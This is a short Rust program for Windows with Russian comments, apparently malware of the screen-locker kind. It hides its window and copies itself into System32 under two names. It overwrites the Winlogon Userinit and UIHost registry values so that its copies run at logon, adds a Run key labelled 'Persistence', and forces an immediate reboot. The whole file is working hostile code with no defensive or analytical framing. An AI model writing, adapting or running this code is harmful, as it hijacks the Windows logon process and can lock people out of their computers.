#![windows_subsystem = "windows"]

use std::fs;
use std::path::PathBuf;
use winreg::RegKey;
use winreg::enums::*;

const VIDEO_BLOB: &[u8] = b"DUMMY_VIDEO_DATA";

fn main() {
    let sys = PathBuf::from(std::env::var("SYSTEMROOT").unwrap()).join("System32");
    let dest_gate = sys.join("gate_keeper.exe");
    let dest_screen = sys.join("screen_holder.exe");
    let video_path = sys.join("video.mp4");

    // Создаём dummy видео
    let _ = fs::write(&video_path, VIDEO_BLOB);
    
    // Копируем бинарники
    let current_exe = std::env::current_exe().unwrap();
    let _ = fs::copy(&current_exe, &dest_gate);
    let _ = fs::copy(&current_exe, &dest_screen);

    // Работа с реестром
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(winlogon) = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        KEY_SET_VALUE
    ) {
        let gate_val = dest_gate.to_str().unwrap().to_owned() + ",userinit.exe";
        let _ = winlogon.set_value("Userinit", &gate_val);
        let _ = winlogon.set_value("UIHost", &dest_screen.to_str().unwrap().to_owned());
    }

    if let Ok(run) = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_SET_VALUE
    ) {
        let _ = run.set_value("Persistence", &dest_screen.to_str().unwrap().to_owned());
    }

    // Перезагрузка
    let _ = std::process::Command::new("shutdown")
        .args(["/r", "/t", "0", "/f"])
        .status();
}
